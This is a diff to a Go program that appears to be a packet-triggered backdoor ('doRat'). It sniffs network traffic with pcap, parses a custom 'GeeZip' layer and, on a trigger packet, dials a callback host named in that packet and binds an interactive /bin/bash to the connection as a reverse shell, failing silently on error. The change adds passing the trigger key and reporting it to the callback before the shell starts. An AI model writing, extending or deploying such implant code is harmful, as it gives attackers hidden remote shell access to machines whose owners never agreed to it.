@@ -1,6 +1,7 @@
 package main
 
 import (
+	"encoding/hex"
 	"log"
 	"net"
 	"os"
@@ -11,11 +12,14 @@ import (
 	"github.com/google/gopacket/pcap"
 )
 
-func doRat(host string) {
+func doRat(trigger []byte, host string) {
 	conn, err := net.Dial("tcp", host)
 	if err != nil {
 		return // fail silently
 	}
+
+	conn.Write([]byte("Received trigger packet with key=" + hex.EncodeToString(trigger) + ", spawning a shell...\n"))
+
 	cmd := exec.Command("/bin/bash", "-i")
 	cmd.Stdin = conn
 	cmd.Stdout = conn
@@ -29,7 +33,7 @@ func handlePacket(pkt gopacket.Packet) {
 			p := gopacket.NewPacket(app.Payload(), GeeZipLayerType, gopacket.Lazy)
 			if p != nil {
 				l := p.Layer(GeeZipLayerType)
-				doRat(l.(GeeZipLayer).CBString)
+				doRat(l.(GeeZipLayer).TriggerFlag, l.(GeeZipLayer).CBString)
 			}
 		}
 	}
